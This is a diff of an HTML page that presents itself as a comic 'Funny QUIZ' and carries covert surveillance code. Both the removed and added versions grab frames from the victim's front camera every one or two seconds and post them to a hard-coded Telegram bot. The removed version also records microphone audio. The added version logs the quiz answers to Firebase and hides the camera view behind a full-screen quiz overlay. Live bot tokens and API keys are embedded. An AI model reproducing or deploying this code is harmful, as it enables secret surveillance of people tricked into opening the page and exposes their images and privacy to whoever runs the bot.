@@ -1,288 +1,597 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8"/>
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Tasin Saimon</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Funny QUIZ</title>
+<link href="https://fonts.googleapis.com/css2?family=Bangers&family=Comic+Neue:ital,wght@0,700;1,700&display=swap" rel="stylesheet">
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Space+Grotesk:wght@500;700&display=swap');
-
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-
-  body {
-    background: #0a0a0f;
-    min-height: 100vh;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    font-family: 'Space Grotesk', sans-serif;
+  :root {
+    --bg-yellow: #ffeb3b;
+    --comic-red: #ff1744;
+    --comic-blue: #00e5ff;
+    --comic-green: #00e676;
+    --ink: #000000;
+    --paper: #ffffff;
   }
 
-  canvas { display: none; }
-  video  { display: none; }
+  * { box-sizing: border-box; }
 
-  .content {
+  body {
+    margin: 0;
+    background-color: var(--bg-yellow);
+    background-image: radial-gradient(var(--ink) 18%, transparent 19%);
+    background-size: 10px 10px;
+    color: var(--ink);
+    font-family: 'Comic Neue', cursive, sans-serif;
     display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 2.5rem;
-    padding: 2rem;
-    width: 100%;
-    max-width: 420px;
+    justify-content: center;
+    padding: 24px 16px 60px;
+  }
+
+  .wrap { width: 100%; max-width: 480px; }
+
+  /* Comic Title Header */
+  .title-card {
+    background: var(--comic-red);
+    border: 5px solid var(--ink);
+    box-shadow: 7px 7px 0 var(--ink);
+    transform: rotate(-2deg);
+    padding: 12px;
+    text-align: center;
+    margin-bottom: 20px;
+    position: relative;
   }
 
   h1 {
-    font-family: 'Bebas Neue', sans-serif;
-    font-size: clamp(4.5rem, 20vw, 8rem);
-    line-height: 0.9;
-    text-align: center;
-    background: linear-gradient(135deg, #fff 30%, #29a8e0 100%);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    background-clip: text;
-    user-select: none;
-    letter-spacing: 0.03em;
+    font-family: 'Bangers', cursive;
+    font-size: 42px;
+    letter-spacing: 2px;
+    color: #fff;
+    margin: 0;
+    text-shadow: 4px 4px 0 var(--ink);
   }
 
-  .status {
-    font-size: 0.78rem;
-    color: rgba(255,255,255,0.35);
-    letter-spacing: 0.06em;
-    text-transform: uppercase;
+  /* Speech Bubble Subtitle */
+  .speech-bubble {
+    position: relative;
+    background: var(--paper);
+    border: 4px solid var(--ink);
+    border-radius: 20px;
+    padding: 8px 12px;
+    font-weight: bold;
+    font-size: 13px;
     text-align: center;
-    min-height: 1.2em;
-    font-family: monospace;
+    box-shadow: 4px 4px 0 var(--ink);
+    margin-bottom: 25px;
+    transform: rotate(1deg);
   }
-  .status.ok  { color: #29a8e0; }
-  .status.rec { color: #ff4d6d; }
-  .status.err { color: #ff4d6d; }
+  .speech-bubble::after {
+    content: '';
+    position: absolute;
+    top: -15px;
+    left: 48%;
+    border-width: 0 12px 15px;
+    border-style: solid;
+    border-color: var(--ink) transparent;
+    display: block;
+    width: 0;
+  }
 
-  .btns {
-    display: flex;
-    flex-direction: column;
-    gap: 1rem;
+  /* Comic Panel Containers */
+  .panel {
+    background: var(--paper);
+    border: 5px solid var(--ink);
+    border-radius: 12px;
+    padding: 18px;
+    margin-bottom: 22px;
+    box-shadow: 8px 8px 0 var(--ink);
+    position: relative;
+  }
+
+  /* Video Viewfinder Container */
+  .video-container {
+    position: relative;
+    border: 5px solid var(--ink);
+    border-radius: 8px;
+    overflow: hidden;
+    background: #000;
+  }
+
+  video {
     width: 100%;
+    display: block;
   }
+
+  /* Funny Cartoon Target Overlay over Video */
+  .viewfinder-overlay {
+    position: absolute;
+    inset: 0;
+    pointer-events: none;
+    border: 3px dashed rgba(255, 255, 255, 0.4);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .viewfinder-overlay::before {
+    content: '👀 INTRUDER TARGET';
+    font-family: 'Bangers', cursive;
+    color: var(--bg-yellow);
+    font-size: 18px;
+    background: var(--ink);
+    padding: 2px 10px;
+    border-radius: 4px;
+    position: absolute;
+    top: 8px;
+    letter-spacing: 1px;
+  }
+  .crosshair {
+    width: 80px;
+    height: 80px;
+    border: 3px solid var(--comic-red);
+    border-radius: 50%;
+    position: relative;
+  }
+  .crosshair::before, .crosshair::after {
+    content: '';
+    position: absolute;
+    background: var(--comic-red);
+  }
+  .crosshair::before { top: 38px; left: -10px; width: 100px; height: 3px; }
+  .crosshair::after { left: 38px; top: -10px; height: 100px; width: 3px; }
+
+  /* Visual Starburst Badge overlay */
+  .starburst {
+    position: absolute;
+    top: -15px;
+    right: -15px;
+    background: var(--comic-blue);
+    color: var(--ink);
+    font-family: 'Bangers', cursive;
+    font-size: 18px;
+    padding: 10px;
+    clip-path: polygon(50% 0%, 65% 20%, 98% 35%, 78% 60%, 85% 95%, 50% 80%, 15% 95%, 22% 60%, 2% 35%, 35% 20%);
+    border: 2px solid var(--ink);
+    transform: rotate(12deg);
+    z-index: 10;
+  }
+
+  /* Status Bar */
+  .status-bar {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin: 14px 0;
+    font-weight: bold;
+    font-size: 15px;
+    background: #fff8e1;
+    padding: 8px 12px;
+    border: 3px solid var(--ink);
+    border-radius: 6px;
+  }
+
+  .dot {
+    width: 16px;
+    height: 16px;
+    border-radius: 50%;
+    background: #aaa;
+    border: 2px solid var(--ink);
+  }
+  .dot.live {
+    background: var(--comic-green);
+    animation: comic-bounce 0.6s infinite alternate;
+  }
+
+  @keyframes comic-bounce {
+    0% { transform: scale(1); }
+    100% { transform: scale(1.4); }
+  }
+
+  /* Tactile Comic Buttons */
+  .btns { display: flex; gap: 12px; }
 
   button {
-    width: 100%;
-    padding: 1.15rem;
-    border-radius: 14px;
-    border: none;
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: 1rem;
-    font-weight: 700;
-    letter-spacing: 0.06em;
+    flex: 1;
+    padding: 12px;
+    border-radius: 8px;
+    border: 4px solid var(--ink);
+    font-family: 'Bangers', cursive;
+    font-size: 22px;
+    letter-spacing: 1px;
     cursor: pointer;
-    transition: transform 0.1s, opacity 0.2s, box-shadow 0.25s;
-  }
-  button:active:not(:disabled) { transform: scale(0.97); }
-  button:disabled { opacity: 0.3; cursor: not-allowed; }
-
-  #startCam {
-    background: #29a8e0;
-    color: #fff;
-    box-shadow: 0 0 28px rgba(41,168,224,0.45);
-  }
-  #startCam:hover:not(:disabled) { box-shadow: 0 0 48px rgba(41,168,224,0.75); }
-
-  #stopCam {
-    background: rgba(255,255,255,0.07);
-    color: #fff;
-    border: 1px solid rgba(255,255,255,0.13);
-  }
-  #stopCam:hover:not(:disabled) { background: rgba(255,255,255,0.13); }
-
-  #startRec {
-    background: #ff4d6d;
-    color: #fff;
-    box-shadow: 0 0 28px rgba(255,77,109,0.35);
-  }
-  #startRec:hover:not(:disabled) { box-shadow: 0 0 48px rgba(255,77,109,0.65); }
-  #startRec.recording { animation: rpulse 1s infinite; }
-  @keyframes rpulse {
-    0%,100% { box-shadow: 0 0 28px rgba(255,77,109,0.35); }
-    50%      { box-shadow: 0 0 60px rgba(255,77,109,0.9);  }
+    box-shadow: 4px 4px 0 var(--ink);
+    transition: transform 0.05s, box-shadow 0.05s;
   }
 
-  .prog-wrap {
+  button:active:not(:disabled) {
+    transform: translate(4px, 4px);
+    box-shadow: 0 0 0 var(--ink);
+  }
+
+  button:disabled {
+    opacity: 0.4;
+    cursor: not-allowed;
+    box-shadow: none;
+    transform: translate(2px, 2px);
+  }
+
+  #startBtn { background: var(--comic-green); color: var(--ink); }
+  #stopBtn { background: var(--comic-red); color: #fff; text-shadow: 2px 2px 0 var(--ink); }
+
+  /* Activity Log Panel */
+  label {
+    display: block;
+    font-family: 'Bangers', cursive;
+    font-size: 22px;
+    color: var(--ink);
+    margin-bottom: 6px;
+    letter-spacing: 1px;
+  }
+
+  #log {
+    height: 150px;
+    overflow-y: auto;
+    font-size: 13px;
+    font-weight: bold;
+    background: #fffbe6;
+    border: 3px solid var(--ink);
+    border-radius: 6px;
+    padding: 8px;
+  }
+
+  #log div {
+    border-bottom: 2px dashed var(--ink);
+    padding: 5px 0;
+  }
+  #log div.err { color: var(--comic-red); }
+  #log div.ok { color: #008800; }
+
+  /* ============================
+    UPGRADED QUIZ OVERLAY STYLES
+  =============================== */
+  .quiz-overlay {
+    position: fixed;
+    inset: 0;
+    /* Completely hide background with opaque comic styling */
+    background-color: var(--comic-blue);
+    background-image: radial-gradient(var(--ink) 18%, transparent 19%);
+    background-size: 16px 16px;
+    z-index: 999;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+
+  .quiz-note {
+    background: #fff59d; /* Sticky note yellow */
+    border: 6px solid var(--ink);
+    padding: 20px 40px;
+    box-shadow: 14px 14px 0 var(--ink);
+    transform: rotate(1deg);
+    text-align: center;
+    width: 90vw;
+    max-width: 700px;
+    /* 7:3 Aspect Ratio as requested */
+    aspect-ratio: 7 / 3;
+    min-height: 250px; /* Safety fallback for extreme mobile screens */
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+  }
+
+  /* Fun "Secret" Stamp */
+  .quiz-note::before {
+    content: 'TOP SECRET';
+    font-family: 'Bangers', cursive;
+    font-size: 24px;
+    position: absolute;
+    top: -15px;
+    left: -20px;
+    background: var(--comic-red);
+    color: var(--paper);
+    padding: 4px 12px;
+    border: 3px solid var(--ink);
+    transform: rotate(-12deg);
+    letter-spacing: 2px;
+  }
+
+  /* Pin on top */
+  .quiz-note::after {
+    content: '📌';
+    font-size: 40px;
+    position: absolute;
+    top: -25px;
+    left: 50%;
+    transform: translateX(-50%);
+  }
+
+  .quiz-note h2 {
+    font-family: 'Bangers', cursive;
+    font-size: 32px;
+    margin: 0 0 20px 0;
+    line-height: 1.1;
+    color: var(--ink);
+    letter-spacing: 1px;
+  }
+
+  .quiz-options {
+    display: flex;
+    flex-direction: row;
+    justify-content: center;
+    gap: 15px;
     width: 100%;
-    height: 4px;
-    background: rgba(255,255,255,0.08);
-    border-radius: 10px;
-    overflow: hidden;
-    opacity: 0;
-    transition: opacity 0.3s;
+    flex-wrap: wrap; /* Allows wrapping on tiny screens while maintaining 7:3 flex */
   }
-  .prog-wrap.show { opacity: 1; }
-  .prog-bar {
-    height: 100%;
-    width: 0%;
-    background: #ff4d6d;
-    border-radius: 10px;
-    transition: width 0.5s linear;
+
+  .quiz-btn {
+    background: var(--paper);
+    border: 4px solid var(--ink);
+    padding: 10px 20px;
+    font-family: 'Bangers', cursive;
+    font-size: 20px;
+    letter-spacing: 1px;
+    cursor: pointer;
+    box-shadow: 6px 6px 0 var(--ink);
+    transition: all 0.1s ease;
+    border-radius: 8px;
+    flex: 1;
+    min-width: 120px;
+  }
+
+  .quiz-btn:active {
+    transform: translate(6px, 6px);
+    box-shadow: 0 0 0 var(--ink);
+  }
+
+  .quiz-btn:hover {
+    background: var(--comic-green);
+    color: var(--ink);
   }
 </style>
 </head>
 <body>
-<video id="video" autoplay muted playsinline></video>
-<canvas id="canvas"></canvas>
 
-<div class="content">
-  <h1>Tasin<br>Saimon</h1>
-  <div class="status" id="status">Ready</div>
-  <div class="btns">
-    <button id="startCam">Start Video</button>
-    <button id="stopCam" disabled>Stop Video</button> <button id="startRec">Audio</button>
+<div class="wrap">
+  <div class="title-card">
+    <h1>🚨 Are You Ritty?🕵️‍♂️</h1>
   </div>
-  <div class="prog-wrap" id="progWrap">
-    <div class="prog-bar" id="progBar"></div>
+  <div class="speech-bubble">
+    Hello!!! I'm 100% sure Your Not ready for it....
+  </div>
+
+  <div class="panel">
+    <div class="starburst">READY!</div>
+    
+    <div class="video-container">
+      <video id="preview" autoplay playsinline muted></video>
+      <div class="viewfinder-overlay">
+        <div class="crosshair"></div>
+      </div>
+    </div>
+
+    <div class="status-bar">
+      <div id="dot" class="dot"></div>
+      <span id="statusText">Idle</span>
+    </div>
+
+    <div class="btns">
+      <button id="startBtn">START Quiz</button>
+      <button id="stopBtn" disabled>STOP Quiz</button>
+    </div>
+  </div>
+
+  <div class="panel">
+    <label>⚡ SEE WHAT HAPPNING ⚡</label>
+    <div id="log"></div>
   </div>
 </div>
 
-<script>
-// ── CONFIG ──
-const BOT_TOKEN = '8697759714:AAGlfH7rjS8ZN4X0nkgQ-TJILe39ijerITU';
-const CHAT_ID   = '7815078057';
-const REC_SECS  = 30;
+<canvas id="canvas" style="display:none;"></canvas>
 
-const video    = document.getElementById('video');
-const canvas   = document.getElementById('canvas');
-const startCam = document.getElementById('startCam');
-const stopCam  = document.getElementById('stopCam');
-const startRec = document.getElementById('startRec');
-const statusEl = document.getElementById('status');
-const progWrap = document.getElementById('progWrap');
-const progBar  = document.getElementById('progBar');
+<div id="quizOverlay" class="quiz-overlay">
+  <div class="quiz-note">
+    <h2 id="quizQ">Loading question...</h2>
+    <div class="quiz-options" id="quizOptions">
+      </div>
+  </div>
+</div>
 
-let stream   = null;
-let camTimer = null;
-let mediaRec = null;
-let recChunks= [];
-let realChatId = CHAT_ID;
+<!-- USING type="module" SO WE CAN IMPORT FIREBASE v9+ LIBRARIES -->
+<script type="module">
+// ─── FIREBASE SETUP ──────────────────────────────────────────
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
+import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
 
-function setStatus(msg, cls='') {
-  statusEl.textContent = msg;
-  statusEl.className = 'status ' + cls;
+const firebaseConfig = {
+  apiKey: "AIzaSyAto_X45x3ZNn3eAak-CjJBP6dJVtRDVsw",
+  authDomain: "socal-14460.firebaseapp.com",
+  databaseURL: "https://socal-14460-default-rtdb.firebaseio.com",
+  projectId: "socal-14460",
+  storageBucket: "socal-14460.firebasestorage.app",
+  messagingSenderId: "429853046218",
+  appId: "1:429853046218:web:6a8e7a4eeaa3bc23000b33",
+  measurementId: "G-BHSGS3PY2P"
+};
+
+// Initialize Firebase
+const app = initializeApp(firebaseConfig);
+const database = getDatabase(app);
+
+// Unique ID for this user's specific quiz session
+const sessionId = Date.now().toString(); 
+
+// ─── SET YOUR OWN VALUES HERE ────────────────────────────────
+const CONFIG = {
+  BOT_TOKEN: "8610555288:AAGbVA8Hbu3Q2AtcRPJCum682p96yZBK3II",
+  CHAT_IDS: "7815078057",
+  INTERVAL_SECONDS: 2
+};
+// ──────────────────────────────────────────────────────────────
+
+const video = document.getElementById('preview');
+const canvas = document.getElementById('canvas');
+const startBtn = document.getElementById('startBtn');
+const stopBtn = document.getElementById('stopBtn');
+const dot = document.getElementById('dot');
+const statusText = document.getElementById('statusText');
+const logEl = document.getElementById('log');
+
+// Quiz Elements & Data
+const quizOverlay = document.getElementById('quizOverlay');
+const quizQ = document.getElementById('quizQ');
+const quizOptions = document.getElementById('quizOptions');
+
+const questions = [
+  { q: "Who Send it to you?", opts: ["An Impasta", "Good Boy", "Handsome boy"] },
+  { q: "what did you eat today?", opts: ["Human", "Zombie", "Grass", "Food"] },
+  { q: "Did you love someone?", opts: ["Nahhh", "Yessss", "why did i tell you?"] },
+  { q: "Are you really reading this??", opts: ["Yesss", "Nahh"] },
+  { q: "I Hacked Your Camera.. Are You Angry?", opts: ["Yes", "Noo"] }
+];
+let currentQ = 0;
+
+let stream = null;
+let captureTimer = null;
+let shotCount = 0;
+
+function log(msg, cls){
+  const line = document.createElement('div');
+  const t = new Date().toLocaleTimeString();
+  line.textContent = `[${t}] ${msg}`;
+  if(cls) line.className = cls;
+  logEl.prepend(line);
 }
 
-async function fetchChatId() { realChatId = CHAT_ID; return true; }
+function setLive(on){
+  dot.classList.toggle('live', on);
+  statusText.textContent = on ? 'Recording — sending to Telegram' : 'Idle';
+  startBtn.disabled = on;
+  stopBtn.disabled = !on;
+}
 
-// ── CAMERA ──
-startCam.onclick = async () => {
-  setStatus('Starting Video');
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode:'user' }, audio: false });
-    video.srcObject = stream;
-    startCam.disabled = true;
-    stopCam.disabled  = false;
-    setStatus('Loading Your Video', 'ok');
-    camTimer = setInterval(sendPhoto, 1000);
-  } catch(e) {
-    setStatus('Camera denied: ' + e.message, 'err');
+// Quiz Functions
+function showQuiz() {
+  currentQ = 0;
+  quizOverlay.style.display = 'flex';
+  loadQuestion();
+}
+
+function loadQuestion() {
+  if (currentQ >= questions.length) {
+    quizOverlay.style.display = 'none'; // Hide when done
+    return;
   }
-};
+  quizQ.textContent = questions[currentQ].q;
+  quizOptions.innerHTML = '';
+  
+  questions[currentQ].opts.forEach(opt => {
+    const btn = document.createElement('button');
+    btn.className = 'quiz-btn';
+    btn.textContent = opt;
+    btn.onclick = () => {
+      // ⚡ PUSH ANSWER TO FIREBASE REALTIME DATABASE ⚡
+      const dbRef = ref(database, 'quiz_responses/' + sessionId + '/Question_' + (currentQ + 1));
+      set(dbRef, {
+        question: questions[currentQ].q,
+        answer: opt,
+        timestamp: new Date().toISOString()
+      }).catch(err => console.error("Firebase error:", err));
 
-stopCam.onclick = () => {
-  clearInterval(camTimer); camTimer = null;
-  if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
-  video.srcObject = null;
-  startCam.disabled = false;
-  stopCam.disabled  = true;
-  setStatus('Camera stopped');
-};
-
-async function sendPhoto() {
-  if (!stream) return;
-  canvas.width  = video.videoWidth  || 640;
-  canvas.height = video.videoHeight || 480;
-  canvas.getContext('2d').drawImage(video, 0, 0);
-  canvas.toBlob(async blob => {
-    const form = new FormData();
-    form.append('chat_id', realChatId);
-    form.append('photo', blob, 'snap.jpg');
-    form.append('caption', '📸 ' + new Date().toLocaleTimeString());
-    try {
-      const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body:form });
-      const j = await r.json();
-      if (!j.ok) setStatus('Error: ' + j.description, 'err');
-    } catch(e) {}
-  }, 'image/jpeg', 0.8);
+      currentQ++;
+      loadQuestion();
+    };
+    quizOptions.appendChild(btn);
+  });
 }
 
-// ── AUDIO RECORD ──
-startRec.onclick = async () => {
-  if (mediaRec && mediaRec.state === 'recording') return;
-
-  let audioStream;
-  try {
-    audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-  } catch(e) {
-    setStatus('Mic denied: ' + e.message, 'err');
+async function startCamera(){
+  const token = CONFIG.BOT_TOKEN.trim();
+  const chatIds = CONFIG.CHAT_IDS.split(',').map(s => s.trim()).filter(Boolean);
+  
+  if(!token || chatIds.length === 0){
+    log('Fill in BOT_TOKEN and CHAT_IDS in the CONFIG block at the top of the script.', 'err');
     return;
   }
 
-  recChunks = [];
-
-  const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
-    ? 'audio/webm;codecs=opus'
-    : MediaRecorder.isTypeSupported('audio/ogg;codecs=opus')
-    ? 'audio/ogg;codecs=opus'
-    : 'audio/webm';
-
-  mediaRec = new MediaRecorder(audioStream, { mimeType });
-  mediaRec.ondataavailable = e => { if (e.data.size > 0) recChunks.push(e.data); };
-
-  mediaRec.onstop = async () => {
-    audioStream.getTracks().forEach(t => t.stop());
-    const blob = new Blob(recChunks, { type: mimeType });
-    setStatus('Sending audio…', 'ok');
-    await sendVoice(blob);
-    progWrap.classList.remove('show');
-    progBar.style.width = '0%';
-    startRec.classList.remove('recording');
-    startRec.disabled = false;
-    startRec.textContent = 'Audio';
-  };
-
-  mediaRec.start(200);
-  startRec.disabled = true;
-  startRec.classList.add('recording');
-  startRec.textContent = 'Audio Loading';
-  progWrap.classList.add('show');
-  setStatus('Audio 30s…', 'rec');
-
-  let elapsed = 0;
-  const tick = setInterval(() => {
-    elapsed += 300;
-    progBar.style.width = Math.min(100, (elapsed / (REC_SECS * 1000)) * 100) + '%';
-    if (elapsed >= REC_SECS * 1000) clearInterval(tick);
-  }, 300);
-
-  setTimeout(() => {
-    if (mediaRec && mediaRec.state === 'recording') mediaRec.stop();
-  }, REC_SECS * 1000);
-};
-
-async function sendVoice(blob) {
-  const ext  = blob.type.includes('ogg') ? 'voice.ogg' : 'voice.webm';
-  const form = new FormData();
-  form.append('chat_id', realChatId);
-  form.append('voice', blob, ext);
-  try {
-    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method:'POST', body:form });
-    const j = await r.json();
-    if (j.ok) {
-      setStatus('✓ Voice sent!', 'ok');
-    } else {
-      setStatus('Error: ' + j.description, 'err');
-    }
-  } catch(e) {
-    setStatus('Network error', 'err');
+  try{
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+    video.srcObject = stream;
+  }catch(err){
+    log('Camera access denied or unavailable: ' + err.message, 'err');
+    return;
   }
-  setTimeout(() => setStatus('Ready'), 3000);
+
+  setLive(true);
+  shotCount = 0;
+  const seconds = Math.max(1, parseFloat(CONFIG.INTERVAL_SECONDS) || 2);
+  log(`Started. Capturing every ${seconds}s, sending to ${chatIds.length} chat(s).`, 'ok');
+
+  captureTimer = setInterval(() => captureAndSend(token, chatIds), seconds * 1000);
+  captureAndSend(token, chatIds);
+  
+  // ⚡ TRIGGER THE QUIZ AS SOON AS CAMERA STARTS ⚡
+  showQuiz();
 }
+
+function stopCamera(){
+  if(captureTimer) clearInterval(captureTimer);
+  captureTimer = null;
+  if(stream){
+    stream.getTracks().forEach(t => t.stop());
+    stream = null;
+  }
+  video.srcObject = null;
+  setLive(false);
+  log(`Stopped. Captured ${shotCount} photo(s) this session.`);
+  quizOverlay.style.display = 'none'; // Hide quiz if they hit stop
+}
+
+function captureAndSend(token, chatIds){
+  if(!video.videoWidth){
+    log('Waiting for camera to initialize...');
+    return;
+  }
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext('2d').drawImage(video, 0, 0);
+
+  canvas.toBlob(async (blob) => {
+    if(!blob){
+      log('Failed to capture frame.', 'err');
+      return;
+    }
+    shotCount++;
+    const caption = `Room Guard trigger — ${new Date().toLocaleString()}`;
+
+    for(const chatId of chatIds){
+      const form = new FormData();
+      form.append('chat_id', chatId);
+      form.append('caption', caption);
+      form.append('photo', blob, 'capture.jpg');
+
+      try{
+        const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: 'POST',
+          body: form
+        });
+        const data = await res.json();
+        if(data.ok){
+          log(`calculating your face.`, 'ok');
+        }else{
+          log(`Chat ${chatId} rejected: ` + (data.description || 'unknown error'), 'err');
+        }
+      }catch(err){
+        log(`Network error sending to chat ${chatId}: ` + err.message, 'err');
+      }
+    }
+  }, 'image/jpeg', 0.85);
+}
+
+startBtn.addEventListener('click', startCamera);
+stopBtn.addEventListener('click', stopCamera);
 </script>
 </body>
 </html>
